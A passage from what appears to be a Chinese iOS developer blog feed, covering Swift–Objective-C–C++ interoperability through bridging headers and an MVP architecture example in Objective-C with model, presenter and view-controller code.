    <content type="html"><![CDATA[<h2 id="Swift与OC混编"><a href="#Swift与OC混编" class="headerlink" title="Swift与OC混编"></a>Swift与OC混编</h2><h3 id="Swift工程中调用OC代码"><a href="#Swift工程中调用OC代码" class="headerlink" title="Swift工程中调用OC代码"></a>Swift工程中调用OC代码</h3><p>不需要在Swift中import OC的类，统一在桥接文件中导入需要暴露给Swift的OC类即可在Swift中访问。具体步骤如下：</p><ol><li><p>创建桥接文件：<br>在Swift工程里创建OC文件，创建完成后Xcode会问你是否需要创建桥接文件，点击<code>Create Bridging Header</code>即可创建桥接文件，并设置好了文件路径。<br><img src="https://upload-images.jianshu.io/upload_images/4881420-9c1bc1525c63eee6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="auto create"></p><p> 还可以手动添加桥接文件，首先创建一个<code>.h</code>文件，命名格式为<code>ProductName-Bridging-Header.h</code>，<br><img src="https://upload-images.jianshu.io/upload_images/4881420-e592ae41a35a9fa8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="manual create"></p><p> 其中<code>Product Name</code>一般是工程名，在<code>Build Settings</code>里面可以搜索到。<br><img src="https://upload-images.jianshu.io/upload_images/4881420-d8ce3a226b86c96c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Product Name"></p><p> 创建完桥接文件之后，还需手动添加文件路径配置，在<code>Build Settings</code>-&gt;<code>Objective-C Bridging Header</code>中加入相对路径，路径起始位置就是工程文件的位置，在这里的示例是放在工程目录。<br> <img src="https://upload-images.jianshu.io/upload_images/4881420-669fce21e2eb3834.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="path"></p></li><li><p>在桥接文件中导入需要的OC类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#import &quot;OCTest.h&quot;</span><br></pre></td></tr></table></figure></li><li><p>使用OC类的方法<br>在任意Swift文件都可以使用导入的OC类的方法，也可以是C方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#import &quot;OCTest.h&quot;</span><br><span class="line"></span><br><span class="line">@implementation OCTest</span><br><span class="line"></span><br><span class="line">- (void)test &#123;</span><br><span class="line">    NSLog(@&quot;This is a OC test method&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ctest() &#123;</span><br><span class="line">    printf(&quot;This is a C method&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>和普通Swift类使用的方法一样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">override func viewDidLoad() &#123;</span><br><span class="line">    super.viewDidLoad()</span><br><span class="line">    &#x2F;&#x2F; Do any additional setup after loading the view.</span><br><span class="line">        </span><br><span class="line">    OCTest().test()</span><br><span class="line">    ctest()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019-04-28 17:48:58.178346+0800 Swift5Demo[95779:2516896] This is a OC test method</span><br><span class="line">This is a C method</span><br></pre></td></tr></table></figure><h3 id="OC调用Swift代码"><a href="#OC调用Swift代码" class="headerlink" title="OC调用Swift代码"></a>OC调用Swift代码</h3></li><li><p>首先把<code>Build Settings</code> -&gt; <code>Defines Module</code>设为<code>YES</code><br><img src="https://upload-images.jianshu.io/upload_images/4881420-2b60fc30eb947ee1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Defines Module"></p></li><li><p>在OC工程中，添加了Swift文件后，Xcode会根据Target创建<code>Objective-C Generated interface Header</code>，即Swift转换OC下生成的接口头文件，在<code>Build Settings</code>-&gt;<code>Objective-C Generated interface Header Name</code>可以查看：<br><img src="https://upload-images.jianshu.io/upload_images/4881420-197ed03d11a5f4ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Objective-C Generated interface Header Name"></p></li><li><p>注意，Swift的类、属性或方法如果想要在OC中使用的，都需要在前面加上<code>@objc open</code>修饰符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@objc open class SwiftTest: NSObject &#123;</span><br><span class="line"></span><br><span class="line">    @objc open var str &#x3D; &quot;swift param&quot;</span><br><span class="line">    </span><br><span class="line">    @objc open func test() &#123;</span><br><span class="line">        print(&quot;This is a Swift method.&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>调用Swift方法<br>首先引入接口头文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#import &quot;OpenDemo-Swift.h&quot;</span><br></pre></td></tr></table></figure><p>然后即可调用Swift的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SwiftTest *swiftTest &#x3D; [[SwiftTest alloc] init];</span><br><span class="line"></span><br><span class="line">NSLog(@&quot;%@&quot;, swiftTest.str);</span><br><span class="line">[swiftTest test];</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019-04-28 17:03:51.478585+0800 OpenDemo[94511:2459635] swift param</span><br><span class="line">This is a Swift method.</span><br></pre></td></tr></table></figure></li></ol><h2 id="Swift和C"><a href="#Swift和C" class="headerlink" title="Swift和C++"></a>Swift和C++</h2><p>Swift不能直接调用C++，但是Objective-C与C++是可以混编，而且可以使用STL，办法就是将OC的.m文件后缀改成.mm，然后在OC类中调用C++的类，封装成几个公共的方法就可以了。这时再用swift来调用OC类里的方法，就可以执行C++语句了。</p><ol><li>创建C++类<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#ifndef CppTest_hpp</span><br><span class="line">#define CppTest_hpp</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">class Test &#123;</span><br><span class="line">public:</span><br><span class="line">    void test();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">---------------------------------</span><br><span class="line"></span><br><span class="line">#include &quot;CppTest.hpp&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void Test::test() &#123;</span><br><span class="line">    cout &lt;&lt; &quot;Hello world&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>创建一个OC类调用C++方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#import &quot;CppTestWraper.h&quot;</span><br><span class="line">#import &quot;CppTest.hpp&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">@implementation CppTestWraper</span><br><span class="line"></span><br><span class="line">- (void)test &#123;</span><br><span class="line">    Test* cppTest &#x3D; new Test();</span><br><span class="line">    cppTest-&gt;test();</span><br><span class="line">    delete cppTest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure></li><li>Swift调用OC方法同上，最后调用：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CppTestWraper().test()</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Swift与OC混编&quot;&gt;&lt;a href=&quot;#Swift与OC混编&quot; class=&quot;headerlink&quot; title=&quot;Swift与OC混编&quot;&gt;&lt;/a&gt;Swift与OC混编&lt;/h2&gt;&lt;h3 id=&quot;Swift工程中调用OC代码&quot;&gt;&lt;a href=&quot;#Swift工程
      
    
    </summary>
    
    
    
      <category term="Tips" scheme="http://xsenyu.github.io/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>iOS 架构模式之 MVP</title>
    <link href="http://xsenyu.github.io/2019/03/18/iOS%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F%E4%B9%8BMVP/"/>
    <id>http://xsenyu.github.io/2019/03/18/iOS%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F%E4%B9%8BMVP/</id>
    <published>2019-03-18T14:10:00.000Z</published>
    <updated>2020-04-06T09:04:26.420Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>软件开发中，最常见的设计模式是<code>Model-View-Controller</code>(MVC)，<code>MVC</code>也是构建<code>Cocoa</code>应用程序的标准模板，<code>MVC</code>设计模式为应用程序中的对象分配三个角色之一：模型，视图或控制器。采用这种模式的好处很多，这些应用程序中的许多对象往往更具可重用性，比其他应用程序更容易扩展。<code>Apple</code>对于<code>Cocoa</code>的MVC框架各角色之间的关系定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/4881420-bd095c1fb37245b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="AppleMVC.png"></p><p>但随着时间的推移，开发的业务不断增多，<code>MVC</code>暴露出了越来越多的问题，随之而衍生出<code>MVP</code>、<code>MVVM</code>、<code>VIPER</code>等更高级架构。本文会先总结<code>MVC</code>在iOS应用开发中的存在的问题，再对<code>MVP</code>设计模式进行客观性描述。</p><h3 id="MVC架构的缺陷"><a href="#MVC架构的缺陷" class="headerlink" title="MVC架构的缺陷"></a>MVC架构的缺陷</h3><ol><li><p>厚重的Controller难以维护。</p><p><code>Controller</code> 层是app的中枢机构，协调模型和视图之间的所有交互,其不仅管理所拥有的视图的视图层次结构，还要响应视图的用户交互操作等等，同时往往也会充满<code>Model</code>层模型逻辑以及<code>View</code>层业务逻辑等等的“胶水代码”。 厚重的Controller 正是由于大量的代码被放进 <code>UIViewController</code>，导致他们变的相当臃肿，一个 <code>UIViewController</code>里的代码成千上万行的事并不是前所未见的。</p><p> 对于厚重的<code>Controller</code>，由于其庞大的规模往往很难维护；包含几十个属性，使他们的状态难以管理；遵循许多协议，导致协议的响应代码和<code>Controller</code>的逻辑代码混淆在一起。行业中对这种控制器有个专业词汇<code>Massive ViewControler</code>（臃肿的视图控制器）。</p></li><li><p>Model层过于单薄。</p><p> 我们通常会在<code>Model</code>层定义数据成员属性，由于无需再手动管理释放变量，Model层既没有对象的构造，也没有复杂的业务处理，<code>implementation</code>基本上都是空的。然而根据 <a href="https://developer.apple.com/library/archive/documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html" target="_blank" rel="noopener">Apple MVC</a><br>文档的描述，<code>Model</code>应包括操作和处理该数据的逻辑和计算，其业务逻辑不应被拖入到<code>Controller</code>。</p><blockquote><p>Model objects encapsulate the data specific to an application and define the logic and computation that manipulate and process that data. …</p></blockquote></li><li><p>较差的可测试性。</p><p> 这一点一方面是因为<code>Cocoa</code>框架里的<code>Controller</code>层，就是我们最熟悉的<code>UIViewController</code>和<code>UIView</code>是天然耦合的，很多<code>UIView</code>的生命周期方法都存在于<code>UIViewController</code>，另一方面我们很多时候也习惯于把UI操作甚至初始化操作放在<code>UIViewController</code>里，导致UI和业务逻辑混杂在一起。当你想对业务逻辑编写单元测试的时候，分离这些成分的单元测试成了一个艰巨的任务，因此大多数人选择忽略这个任务，那就是不做任何测试。</p></li></ol><p><code>Controller</code> 和 <code>View</code> 很难做到相互独立。虽然你可以把控制器里的一些业务逻辑和数据转换的工作交给 <code>Model</code>，但是你再想把负担往 <code>View</code> 里面分摊的时候就没办法了；因为 <code>View</code> 的主要职责就只是将用户的操作行为交给 <code>Controller</code> 去处理而已。于是 <code>ViewController</code> 最终就变成了所有东西的代理和数据源，甚至还负责网络请求的发起和取消。MVC的架构变成了:</p><p><img src="http://upload-images.jianshu.io/upload_images/4881420-bc70b3b7d1110bff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Real MVC"></p><h3 id="MVC的优化方案之MVP"><a href="#MVC的优化方案之MVP" class="headerlink" title="MVC的优化方案之MVP"></a>MVC的优化方案之MVP</h3><p><code>Model-View-Presenter</code>(MVP)是<code>MVC</code>体系结构模式的一种变体，其主要目的是将放在<code>Controller</code>里面的业务逻辑抽离出来，让<code>UIViewController</code>和<code>UIView</code>整合成<code>View</code>层，只负责页面布局和交互相关功能，从而减轻<code>UIViewController</code>的负担，并有利于对业务逻辑功能进行单元测试。</p><ul><li>Model层：数据层，或者负责处理数据的 <a href="https://en.wikipedia.org/wiki/Data_access_layer" target="_blank" rel="noopener">数据接口层</a>。比如 <em>Person</em> 和 <em>PersonDataProvider</em> 类</li><li>View层：展示层(GUI)。对于 iOS 来说所有以 UI 开头的类基本都属于这层。</li><li>Presenter层：作为中间人，协调其他层之间的逻辑。一般来说，当用户对 View 有操作时它负责去修改相应 Model；当 Model 的值发生变化时它负责去更新对应 View。</li></ul><p>MVP在1996年就已经被提出，发展到现在已经出现好多变种，这里提供一种目前比较多人使用的规范：</p><ul><li><code>View</code>层是由<code>UIViewController</code>和<code>UIView</code>共同组成；</li><li><code>View</code>层将委托<code>Presenter</code>层对它自己的操作；</li><li><code>Presenter</code>层拥有对<code>View</code>层交互的逻辑；</li><li><code>Presenter</code>层跟<code>Model</code>层通信，并将数据转化成对适应UI的数据并更新<code>View</code>；</li><li><code>Presenter</code>不需要依赖<code>UIKit</code>；</li><li><code>View</code>层是单一，因为它是被动接受命令，没有主动能力。</li></ul><p>根据以上规范，不同层级关系图如下：</p><p><img src="http://upload-images.jianshu.io/upload_images/4881420-db4bbe124003f207.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="MVP"></p><h3 id="MVP带来的便利"><a href="#MVP带来的便利" class="headerlink" title="MVP带来的便利"></a>MVP带来的便利</h3><ul><li>职责划分清晰 — 业务逻辑划分到Presenter和Model，View只负责页面交互，从而降低耦合度。</li><li>可测性强 — 基于一个功能简单的View层，可以测试大多数业务逻辑。</li><li>复用性 — Presenter和View之间通过抽象方法交互，同样的业务逻辑可以很方便复用。</li></ul><h3 id="MVP的缺点"><a href="#MVP的缺点" class="headerlink" title="MVP的缺点"></a>MVP的缺点</h3><p>由于对视图的渲染放在了Presenter中，所以视图和Presenter的交互会过于频繁。还有一点需要明白，如果Presenter过多地渲染了视图，往往会使得它与特定的视图的联系过于紧密。一旦视图需要变更，那么Presenter也需要变更了</p><h3 id="在iOS工程中使用MVP架构"><a href="#在iOS工程中使用MVP架构" class="headerlink" title="在iOS工程中使用MVP架构"></a>在iOS工程中使用MVP架构</h3><p>接下来会用一个简单的例子说明在iOS实际开发中如何使用<code>MVP</code>进行设计。例子是一个模拟获取用户数据显示到列表的demo。下面是详细设计过程：</p><ul><li><strong>Model层</strong></li></ul><p>首先定义用户信息的<code>Model</code>；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@interface User : NSObject</span><br><span class="line"></span><br><span class="line">@property (nonatomic, strong) NSString *firstName;</span><br><span class="line">@property (nonatomic, strong) NSString *lastName;</span><br><span class="line">@property (nonatomic, strong) NSString *email;</span><br><span class="line">@property (nonatomic, assign) int age;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 类方法构造对象</span><br><span class="line">+ (User *)userWithFirstName:(NSString *)firstName </span><br><span class="line">                   lastName:(NSString *)lastName </span><br><span class="line">                      email:(NSString *)email </span><br><span class="line">                        age:(int)age;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>另外定义一个<code>Service</code>，专门负责数据处理，在这里模拟请求返回数据；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@implementation UserService</span><br><span class="line"></span><br><span class="line">- (void)getUsers:(void(^)(NSArray&lt;User *&gt; *users))handler &#123;</span><br><span class="line">    User *user1 &#x3D; [User userWithFirstName:@&quot;First1&quot; lastName:@&quot;Last1&quot; email:@&quot;Iyad@test.com&quot; age:36];</span><br><span class="line">    User *user2 &#x3D; [User userWithFirstName:@&quot;First2&quot; lastName:@&quot;Last2&quot; email:@&quot;Mila@test.com&quot; age:24];</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 模拟网络请求耗时</span><br><span class="line">    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123;</span><br><span class="line">        handler(@[user1, user2]);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><ul><li><strong>Presenter层</strong></li></ul><p>首先创建一个能让<code>View</code>直接使用的数据模型，其包含<code>View</code>需要的所有信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@interface UserViewData : NSObject</span><br><span class="line"></span><br><span class="line">@property (nonatomic, strong) NSString *name;</span><br><span class="line">@property (nonatomic, strong) NSString *age;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>接下来是<code>View</code>的抽象方法，<code>Presenter</code>可以不用知道是哪个<code>ViewController</code>，就可以直接调用其方法，在这里使用<code>protocol</code>方法；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@protocol UserView &lt;NSObject&gt; </span><br><span class="line"></span><br><span class="line">- (void)startLoading;</span><br><span class="line">- (void)finishLoading;</span><br><span class="line">- (void)setUsers:(NSArray&lt;UserViewData *&gt; *)users;</span><br><span class="line">- (void)setEmptyUsers;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>协议中的方法会在<code>View</code>中实现，<code>Presenter</code>会调用这些方法来更新界面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">@interface UserPresenter() </span><br><span class="line"></span><br><span class="line">@property (nonatomic, strong) UserService *userService;</span><br><span class="line">@property (nonatomic, weak) id&lt;UserView&gt; userView;</span><br><span class="line"></span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">@implementation UserPresenter </span><br><span class="line"></span><br><span class="line">- (instancetype)initWithUserService:(UserService *)userService &#123;</span><br><span class="line">    if (self &#x3D; [super init]) &#123;</span><br><span class="line">        self.userService &#x3D; userService;</span><br><span class="line">    &#125;</span><br><span class="line">    return self;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (void)attachView:(id&lt;UserView&gt;)view &#123;</span><br><span class="line">    _userView &#x3D; view;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (void)detachView &#123;</span><br><span class="line">    _userView &#x3D; nil;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (void)getUsers &#123;</span><br><span class="line">    [_userView startLoading];</span><br><span class="line">    __weak typeof(self) weakSelf &#x3D; self;</span><br><span class="line">    [_userService getUsers:^(NSArray&lt;User *&gt; *users)&#123;</span><br><span class="line">        [weakSelf.userView finishLoading];</span><br><span class="line">        if (users.count &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            [weakSelf.userView setEmptyUsers];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            NSMutableArray *userArray &#x3D; [NSMutableArray array];</span><br><span class="line">            for(User *user in users) &#123;</span><br><span class="line">                UserViewData *userData &#x3D; [[UserViewData alloc] init];</span><br><span class="line">                userData.name &#x3D; [NSString stringWithFormat:@&quot;%@ %@&quot;, user.firstName, user.lastName];</span><br><span class="line">                userData.age &#x3D; [NSString stringWithFormat:@&quot;%d years&quot;, user.age];</span><br><span class="line">                [userArray addObject:userData];</span><br><span class="line">            &#125;</span><br><span class="line">            [weakSelf.userView setUsers:userArray];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>Presenter通过<code>attachView:</code>方法绑定视图，并实现业务逻辑，在数据更新时调用协议方法更新界面；Presenter内还包含关于User数据模型转换成视图能用的<code>UserViewData</code>格式的工作。</p><ul><li><strong>View层</strong></li></ul><p><code>View</code>持有<code>Presenter</code>对象，实现<code>Presenter</code>页面交互协议方法，并在初始化时绑定到，用户交互时调用<code>Presenter</code>更新数据；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">@interface ViewController()&lt;UITableViewDataSource, UserView&gt;</span><br><span class="line"></span><br><span class="line">@property (weak, nonatomic) IBOutlet UIView *emptyView;</span><br><span class="line">@property (weak, nonatomic) IBOutlet UITableView *tableView;</span><br><span class="line">@property (weak, nonatomic) IBOutlet UIActivityIndicatorView *activityIndicator;</span><br><span class="line"></span><br><span class="line">@property (nonatomic, strong) UserPresenter *userPresenter;</span><br><span class="line">@property (nonatomic, strong) NSArray *usersToDisplay;</span><br><span class="line"></span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">@implementation ViewController</span><br><span class="line"></span><br><span class="line">#pragma mark - life cycles</span><br><span class="line">- (void)viewDidLoad &#123;</span><br><span class="line">    [super viewDidLoad];</span><br><span class="line">    </span><br><span class="line">    _tableView.dataSource &#x3D; self;</span><br><span class="line">    _activityIndicator.hidesWhenStopped &#x3D; YES;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 绑定视图</span><br><span class="line">    [self.userPresenter attachView:self];</span><br><span class="line">    &#x2F;&#x2F; 获取用户数据</span><br><span class="line">    [self.userPresenter getUsers];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#pragma mark - UserView</span><br><span class="line">- (void)startLoading &#123;</span><br><span class="line">    [_activityIndicator startAnimating];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (void)finishLoading &#123;</span><br><span class="line">    [_activityIndicator stopAnimating];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (void)setUsers:(NSArray&lt;UserViewData *&gt; *)users &#123;</span><br><span class="line">    _usersToDisplay &#x3D; users;</span><br><span class="line">    _tableView.hidden &#x3D; NO;</span><br><span class="line">    _emptyView.hidden &#x3D; YES;</span><br><span class="line">    [_tableView reloadData];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (void)setEmptyUsers &#123;</span><br><span class="line">    _tableView.hidden &#x3D; YES;</span><br><span class="line">    _tableView.hidden &#x3D; NO;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#pragma mark - UITableViewDataSource</span><br><span class="line">- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section &#123;</span><br><span class="line">    return self.usersToDisplay.count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath &#123;</span><br><span class="line">    UITableViewCell *cell &#x3D; [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:@&quot;UserCell&quot;];</span><br><span class="line">    UserViewData *user &#x3D; [self.usersToDisplay objectAtIndex:indexPath.row];</span><br><span class="line">    cell.textLabel.text &#x3D; user.name;</span><br><span class="line">    cell.detailTextLabel.text &#x3D; user.age;</span><br><span class="line">    return 